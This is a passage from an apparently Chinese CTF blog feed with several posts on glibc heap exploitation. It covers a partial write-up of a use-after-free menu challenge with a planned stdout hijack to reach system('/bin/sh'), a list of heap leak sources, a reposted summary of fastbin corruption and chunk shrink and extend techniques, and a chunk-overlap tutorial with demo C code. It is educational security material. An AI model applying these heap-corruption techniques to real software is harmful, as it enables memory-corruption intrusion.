&#123;<br>      menu();                                   <span class="hljs-regexp">//</span> puts(<span class="hljs-string">&quot;1.new&quot;</span>);<br>                                                <span class="hljs-regexp">//</span>   puts(<span class="hljs-string">&quot;2.change&quot;</span>);<br>                                                <span class="hljs-regexp">//</span>   puts(<span class="hljs-string">&quot;3.release&quot;</span>);<br>                                                <span class="hljs-regexp">//</span>   puts(<span class="hljs-string">&quot;4.exit&quot;</span>);<br>                                                <span class="hljs-regexp">//</span>   return printf(<span class="hljs-string">&quot;Choice:&quot;</span>);<br>      memset(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>x10uLL);<br>      read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0</span>xFuLL);<br>      v3 = atoi(&amp;s);<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      edit_one();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>    &#123;<br>      dele_one();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>      newone();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>很普遍的一个菜单题,但是少了输出这一项</p><h5 id="new-onw"><a href="#new-onw" class="headerlink" title="new_onw"></a>new_onw</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">newone</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-24h]</span><br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index:&quot;</span>);<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x10uLL</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0xFuLL</span>);<br>  v1 = <span class="hljs-built_in">atoi</span>(&amp;s);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">5</span> &amp;&amp; !ptr[v1] )<br>  &#123;<br>    ptr[v1] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x68uLL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content:&quot;</span>, &amp;s);<br>    <span class="hljs-built_in">sub_400932</span>((__int64)ptr[v1], <span class="hljs-number">0x68u</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们每创建一个,就会分配0x68的内存给他,最多创建五个,然后输入内容</p><h5 id="edit-one"><a href="#edit-one" class="headerlink" title="edit_one"></a>edit_one</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">edit_one</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-24h]</span><br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index:&quot;</span>);<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x10uLL</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0xFuLL</span>);<br>  v1 = <span class="hljs-built_in">atoi</span>(&amp;s);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">5</span> &amp;&amp; ptr[v1] )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content:&quot;</span>, &amp;s);<br>    <span class="hljs-built_in">sub_400932</span>((__int64)ptr[v1], <span class="hljs-number">0x68u</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>修改功能</p><h5 id="dele-one"><a href="#dele-one" class="headerlink" title="dele_one"></a>dele_one</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">dele_one</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-24h]</span><br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index:&quot;</span>);<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x10uLL</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0xFuLL</span>);<br>  v1 = <span class="hljs-built_in">atoi</span>(&amp;s);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">5</span> &amp;&amp; ptr[v1] &amp;&amp; dword_602098 &lt;= <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(ptr[v1]);<br>    ++dword_602098;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里是free函数,可以看到没有置零,漏洞点就在这里</p><p>程序主体很简单,唯一就是没有可以输出的地方,而这样就没办法去leak了,这次我就用两种方法来做这道题,一种方法是<a href="http://p4nda.top/2018/08/27/WDBCTF-2018/">panda师傅</a>的,另一个就是网上比较多的通过劫持.bss段上的stdout然后通过printf函数触发</p><p>先看看防护</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gams">╭─azeral@Azeral /mnt/d/pwn/blind<br>╰─<span class="hljs-symbol">$</span> checksec blind<br>[*] Checking <span class="hljs-keyword">for</span> new versions of pwntools<br>    To disable this functionality, <span class="hljs-keyword">set</span> the <span class="hljs-comment">contents of</span> /home/<span class="hljs-comment">azeral</span>/.pwntools-cache/<span class="hljs-comment">update to</span> <span class="hljs-comment">&#x27;never&#x27;</span><span class="hljs-comment">.</span><br>[*] You <span class="hljs-comment">have the latest version of Pwntools (3.12.2)</span><br>[*] <span class="hljs-string">&#x27;/mnt/d/pwn/blind/blind&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full <span class="hljs-comment">RELRO</span><br>    Stack:    Canary <span class="hljs-comment">found</span><br>    NX:       NX <span class="hljs-comment">enabled</span><br>    PIE:      No <span class="hljs-comment">PIE (0x400000)</span><br></code></pre></td></tr></table></figure><p>因为开了FULL RELRO,所以这里就没办法劫持GOT表了,但是我又翻了翻程序,发现居然有直接给的system,就简化了很多步骤</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_4008E3</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&quot;/bin/sh&quot;</span>)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>并且.bss段包含了stdout</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602020</span>                 public stdout<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602020</span> ; FILE *stdout<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602020</span> stdout          dq ?                    ; DATA XREF: LOAD<span class="hljs-function">:0000000000400330</span>↑o<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602020</span>                                         ; sub_400882+22↑r<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602020</span>                                         ; Copy of shared data<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602028</span>                 align 10h<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602030</span>                 public stdin<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602030</span> ; FILE *stdin<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602030</span> stdin           dq ?                    ; DATA XREF: LOAD<span class="hljs-function">:00000000004003C0</span>↑o<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602030</span>                                         ; sub_400882+4↑r<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602030</span>                                         ; Copy of shared data<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602038</span>                 align 20h<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602040</span>                 public stderr<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602040</span> ; FILE *stderr<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602040</span> stderr          dq ?                    ; DATA XREF: LOAD<span class="hljs-function">:0000000000400420</span>↑o<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602040</span>                                         ; sub_400882+40↑r<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602040</span>                                         ; Copy of shared data<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602048</span> byte_602048     db ?                    ; DATA XREF: sub_400850↑r<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602048</span>                                         ; sub_400850+12↑w<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602049</span>                 align 20h<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602060</span> ; void *ptr[7]<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602060</span> ptr             dq ?                    ; DATA XREF: newone+6A↑r<br><span class="hljs-string">.bss</span><span class="hljs-function">:0000000000602060</span>                                         ; newone+87↑w <span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>因为没有泄露的地方,并且在使用的时候不能劫持got表,因此我们考虑修改stdout的跳转函数,把函数指向system函数</p><p>因为我们需要绕过一些限制,所以要更改flag使得<br><strong>flag&amp;8 &#x3D; 0 and flag &amp;2 &#x3D;0 and flag &amp; 0x8000 !&#x3D; 0</strong><br>而这个0x8000即是_IO_USER_LOCK,相关代码上面都有,可以自行翻阅Hhh<br>后面部分先咕咕咕</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>堆泄露</title>
    <link href="/2019/08/01/%E5%A0%86%E6%B3%84%E9%9C%B2/"/>
    <url>/2019/08/01/%E5%A0%86%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>记录一些日常堆可泄露的东西</p></blockquote><h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><ul><li>main_arena地址</li><li>heap 基地址</li></ul><h1 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h1><p>heap基地址</p><h1 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h1><ul><li>main_arena地址</li><li>heap基地址</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>advanced heap exploiatior(搬运)</title>
    <link href="/2019/07/26/advanced-heap-exploiatior-%E6%90%AC%E8%BF%90/"/>
    <url>/2019/07/26/advanced-heap-exploiatior-%E6%90%AC%E8%BF%90/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在学习chunk extended的是时候google到的,就果断搬运过来了<br>多图预警</p></blockquote><h1 id="搬运自https-www-slideshare-net-AngelBoy1-advanced-heap-exploitaion"><a href="#搬运自https-www-slideshare-net-AngelBoy1-advanced-heap-exploitaion" class="headerlink" title="搬运自https://www.slideshare.net/AngelBoy1/advanced-heap-exploitaion"></a>搬运自<a href="https://www.slideshare.net/AngelBoy1/advanced-heap-exploitaion">https://www.slideshare.net/AngelBoy1/advanced-heap-exploitaion</a></h1><h1 id="advancede-heap-exploiator"><a href="#advancede-heap-exploiator" class="headerlink" title="advancede heap exploiator"></a>advancede heap exploiator</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>glibc-2.19</li><li>kernel-4.2</li><li>64bit</li></ul><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li>Fastbin corruption</li><li>Shrink the chunk</li><li>Extend the chunk</li></ul><h1 id="Fastbin-corruption"><a href="#Fastbin-corruption" class="headerlink" title="Fastbin corruption"></a>Fastbin corruption</h1><h2 id="假设程序有double-free的漏洞"><a href="#假设程序有double-free的漏洞" class="headerlink" title="假设程序有double free的漏洞"></a>假设程序有double free的漏洞</h2><ul><li>目的<ul><li>我们可以利用fastin chunk改掉fd使得下下次malloc该chunk时可以取得自己想要的位置</li></ul></li><li>为了利用double free的楼哦对那个来改比那fee chunk中的fd,我们可以利用一些fastbin的特性达到我们的目的,但我们也必须通过一些chunk的检查</li></ul><h2 id="fastbin的检查"><a href="#fastbin的检查" class="headerlink" title="fastbin的检查"></a>fastbin的检查</h2><h3 id="in-free-p"><a href="#in-free-p" class="headerlink" title="in free(p):"></a>in free(p):</h3><ul><li>chunk address &lt;-size 且alignment</li><li>chunk size &gt; &#x3D;MINSIZE(0X20)且为0x10的倍数</li><li>nextchunk-&gt; size<ul><li>大于MINSIZE(0X20)</li><li>小于system_mem(0x21000)<br>  <strong>检查属于该size的fastbin中的第一块chunk与p是否不同</strong></li></ul></li></ul><h3 id="in-malloc-bytes"><a href="#in-malloc-bytes" class="headerlink" title="in malloc(bytes):"></a>in malloc(bytes):</h3><ul><li>根据size大小取得index之后,到对应的fastbin中找,取出后检查该chunk的(unsigned lond)size事发后属于该fastbin</li><li>但实际比较的时候是先以fastbin中第一块size取得fastbin的index,再去用这个index跟刚刚算的Index是否想用,不过这取index的方式是用unsigned in(4 byte)</li></ul><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><ul><li>一个单链表</li><li>chunk size&lt;&#x3D;0x80 byte</li><li>不取消inuse flag</li><li>依据bin中所存的chunk大小.再分为10个fastbin 分别为0x20,0x30…</li></ul><h3 id="LIFO"><a href="#LIFO" class="headerlink" title="LIFO"></a>LIFO</h3><p>当下次malloc大小与这次free大小相同时,会从相同的bin取出,也就是会取到相同位置的chunk</p><h3 id="fastbin-layout"><a href="#fastbin-layout" class="headerlink" title="fastbin layout"></a>fastbin layout</h3><p>布局我就不多阐述了,之前的文章有写过很多次</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul><li>我们可以利用fastbin的chunk再free的时候只检查属于该size的fastbin中的第一块chunk与p是否不同的特性来创造overlaps chunk</li><li>创造一个circle的singly linked list,这样就可以达到类似UAF的效果</li><li>fd只要符和size是或否属于该chunk就可以通过Malloc检测,因此只要想写入的位置附近有属于该bin的size就可以让malloc分配到该位置<ul><li>根据bytes大小取得index后,到对应的fastbin找,取出后检查该chunk的size事发后属于该fastbin</li><li>但实际比较的时候先是以fatbin中第一块size取得fastbin的index,再去比index和刚刚算的index是否相同,不过这取index的方式是哟个unsigned int(4byte),所以伪造是不用满足8byte</li></ul></li><li>因此没有检查alognment所以不一定要以8的倍数作为chunk的address</li></ul><h1 id="Shrink-the-chunk"><a href="#Shrink-the-chunk" class="headerlink" title="Shrink the chunk"></a>Shrink the chunk</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>假设存在一个和off-by-one的漏洞</p><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>创造出overlap chunk,进而更改其他chunk中的内容</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>主要利用Unsortedbin ,small bin会Unlink做合并的特性来达到我们的目的</p><h2 id="过程-看图食用最佳"><a href="#过程-看图食用最佳" class="headerlink" title="过程(看图食用最佳)"></a>过程(看图食用最佳)</h2><ol><li>一开始先malloc 3 块chunk(A,B,C)到heap段,且fastbin是空的<br><img src="/img/shrink/p1.png" alt="p1"></li><li>free(B)<br><img src="/img/shrink/p2.png" alt="p2"></li><li>free(A)<br><img src="/img/shrink/p3.png" alt="p3"></li><li>malloc(0x38)<br><img src="/img/shrink/p4.png" alt="p4"></li><li>往A中写数据触发off-by-one来覆盖size<br><img src="/img/shrink/p5.png" alt="p5"></li><li>malloc(0x80)<br><img src="/img/shrink/p6.png" alt="p6"></li><li>malloc(0x30)<br><img src="/img/shrink/p7.png" alt="p7"></li><li>free(B)<br><img src="/img/shrink/p8.png" alt="p8"></li><li>free(C)<br><img src="/img/shrink/p9.png" alt="p9"><br>此时会因为C是SMALL BIN的大小的缘故,所以会检测上一块是否inused<br><img src="/img/shrink/p10.png" alt="p10"><br>如果上一块是freed就会根据prev_size去找上一块chunk的header做合并及unlink<br><img src="/img/shrink/p11.png" alt="p11"><br>此时unsortbin村这块大的chunk,所以下次malloc会用这一块先分配给user<br><img src="/img/shrink/p12.png" alt="p12"></li><li>malloc(0x260)<br><img src="/img/shrink/p13.png" alt="p13"><br>此时即可任意修改D<br><img src="/img/shrink/p14.png" alt="p14"></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>如果中间overlap部分有function pointer或者是其他有用的struct可简介控制程序流程</li><li>也可以配合fastbin freed chunk更改fd</li></ul><h1 id="extend-the-chunk"><a href="#extend-the-chunk" class="headerlink" title="extend the chunk"></a>extend the chunk</h1><h2 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h2><p>假设存在一个off-by-one的漏洞</p><h2 id="目的-1"><a href="#目的-1" class="headerlink" title="目的"></a>目的</h2><p>造出overlap chunk,进而更改其他chunk中的内容</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>跟shrink很像,但主要是加大size直接覆盖后面的chunk,只要前面的 chunk header有对上的就行</p><h2 id="过程-配合图食用最佳"><a href="#过程-配合图食用最佳" class="headerlink" title="过程(配合图食用最佳)"></a>过程(配合图食用最佳)</h2><ol><li>一开始先malloc 3 块chunk 到heap段<br><img src="/img/extend/p1.png" alt="p1"></li><li>free(A)<br><img src="/img/extend/p2.png" alt="p1"></li><li>malloc(0x38)<br><img src="/img/extend/p3.png" alt="p1"></li><li>往A中写数据以构造off-by-one<br><img src="/img/extend/p4.png" alt="p1"></li><li>free(B)<br>0x1b1&#x3D;0x171+0x40<br>为了之后可以覆盖c(把c吃进去)<br><img src="/img/extend/p5.png" alt="p1"></li><li>此时会根据B的size去找下一块chunk的hader<br><img src="/img/extend/p6.png" alt="p1"></li><li>此时这块chunk会被合并到top(如果c后面是top)或者加入到unsortbin中<br><img src="/img/extend/p7.png" alt="p1"></li><li>malloc(0x1a0)<br><img src="/img/extend/p8.png" alt="p1"></li><li>此时可以任意更改c<br><img src="/img/extend/p9.png" alt="p1"></li></ol><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>和shrink比起来extend the chunk的限制多了一些,必须要可控off-by-one的那个byte,Shrink只要是null byte即可,相对比较常见但是也不太好发现</p><h1 id="大总结"><a href="#大总结" class="headerlink" title="大总结"></a>大总结</h1><ul><li><p>堆的漏洞利用起来虽然会难一点,但是常常在Full mitigation的情况下都可以利用,毕竟针对heap来说相对应的保护比较少,也较难实现</p></li><li><p>Heap是门艺术(真的是门艺术…爆肝调试就完了</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>chunk extend and overlapping</title>
    <link href="/2019/07/25/chunk-extend-and-overlapping/"/>
    <url>/2019/07/25/chunk-extend-and-overlapping/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本来打算先写off-by-one和unsorted bin atack的…但是鉴于off-by-one和overlapping的联系以及,,,unsorted bin attack..看起来好像真的用处颇少…于是就偷懒先写这个了(逃</p></blockquote><h1 id="chunk-extend"><a href="#chunk-extend" class="headerlink" title="chunk extend"></a>chunk extend</h1><p>chunk的拓展?? 是叫这么魔性的东西吗….大概是对下一个chunk有什么操作吧QAQ,打扰了…</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li>泄露地址<ul><li>Libc地址</li><li>heap地址</li></ul></li><li>泄露数据<ul><li>泄露已经释放的堆中的数据</li><li>泄露chunk内的内容</li></ul></li><li>覆盖指针</li></ul><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li>有堆的漏洞</li><li>可以改变下一个chunk的header域</li></ul><p><em>一般就用在off-by-one了吧..绝配</em></p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>我们知道我们释放的堆块是先不还给操作系统而是由ptmalloc来接管的</p><p>而ptmalloc在获取chunk大小时的代码如下:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">chunksize</span>(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))<br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">chunksize_nomask</span>(p) ((p)-&gt;mchunk_size)<br></code></pre></td></tr></table></figure><ol><li>全部获取</li><li>忽略源码</li></ol><p>而获取下一块chunk地址代码如下:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">next_chunk</span>(p) ((mchunkptr)(((char *) (p)) + <span class="hljs-built_in">chunksize</span>(p)))<br></code></pre></td></tr></table></figure><p>也就是当前块地址+当前块大小</p><p>上一块chunk地址:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">prev_size</span>(p) ((p)-&gt;mchunk_prev_size)<br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">prev_chunk</span>(p) ((mchunkptr)(((char *) (p)) - <span class="hljs-built_in">prev_size</span>(p)))<br>当前块-上一块大小<br></code></pre></td></tr></table></figure><p>判断是否inuse</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#define inuse(p)</span><br>    <span class="hljs-function"><span class="hljs-params">((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br></code></pre></td></tr></table></figure><p>查看prev_inuse域,此域为1即为inuse</p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>也就是说,对于如何判断本chunk相邻chunk的地址完全是通过size来确定的,因而给了我们机会,前辈们真的tql…</p><h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><p>这里引用了<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/#1inusefastbinextend">ctf-wiki</a>的代码,并且我做了一点点小修改:</p><h3 id="inuse状态下"><a href="#inuse状态下" class="headerlink" title="inuse状态下"></a>inuse状态下</h3><ol><li>fastbin</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]ptr:%p\n&quot;</span>,ptr);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;<br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]ptr1:%p\n&quot;</span>,ptr1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>我在第一次malloc处下了断点,然后我们来看看现在堆的情况:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 